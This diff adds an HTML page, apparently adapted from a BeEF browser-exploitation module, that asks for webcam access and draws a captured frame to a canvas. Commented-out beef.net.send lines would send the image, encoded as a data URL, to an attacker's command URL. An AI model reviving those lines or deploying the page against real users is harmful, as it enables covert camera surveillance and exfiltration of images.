@@ -1,0 +1,89 @@
+<html>
+<head><title>This will capture your cam and display in another tab</title></head>
+<body>
+
+<script>
+
+// Build the video element
+var video_element = document.createElement("video");
+video_element.id = "vid_id";
+video_element.style = "display:inline;";
+video_element.autoplay = "true";
+
+// Build the canvas element
+var canvas_element = document.createElement("canvas");
+canvas_element.id ="can_id";
+canvas_element.style = "display:inline;";
+canvas_element.width = "640";
+canvas_element.height = "480";
+
+// Add the elements to the document's body
+document.body.appendChild(video_element);
+document.body.appendChild(canvas_element);
+
+// Returns a drawing context for the canvas element.
+// We want a 2D rendering context, as opposed to a WebGL context (3D)
+var ctx = canvas_element.getContext('2d');
+
+// Define a null set variable for the stream
+var localMediaStream = null;
+
+// This function gets called AFTER we have the media stream setup
+var captureimage = function() {
+  // Checks that there is a non-null stream
+  if (localMediaStream) {
+    // Draw an image into the canvas from the video element
+    // aligned to the top left corner (0,0)
+    ctx.drawImage(video_element,0,0);
+
+    // Send a data: URL back to the attacker with the encoded image
+    // beef.net.send("<%= @command_url %>",
+    //   <%= @command_id %>,
+    //   'image='+canvas_element.toDataURL('image/png'));
+	//window.open(canvas_element.toDataURL('image/png'));
+  } else {
+    // Something didn't work
+    // beef.net.send("<%= @command_url %>",
+    //   <%= @command_id %>,
+    //   'result=something went wrong');
+	alert("Something went wrong");
+  }
+}
+
+// Ensure we grab the correct window.URL object
+window.URL = window.URL || window.webkitURL;
+
+// Ensure we grab the correct getUserMedia function
+navigator.getUserMedia  = navigator.getUserMedia || 
+                          navigator.webkitGetUserMedia ||
+                          navigator.mozGetUserMedia ||
+                          navigator.msGetUserMedia;
+
+// Prompt for permission to grab the camera
+// Then call the function(stream) function - if successful
+navigator.getUserMedia({video:true},function(stream) {
+
+  // set the video element to the URL representation of 
+  // the media stream
+  video_element.src = window.URL.createObjectURL(stream);
+
+  // Copy the stream (this is checked in the captureimage func)
+  localMediaStream = stream;
+
+  // Execute the captureimage function in 2 seconds
+  setTimeout(captureimage,1000);
+  //setInterval(captureimage,16);
+
+}, function(err) {
+  // Couldn't get stream
+  // beef.net.send("<%= @command_url %>",
+  //   <%= @command_id %>,
+  //   'result=getUserMedia call failed');
+	alert("Couldn't get stream");
+});
+
+
+</script>
+
+</body>
+</html>
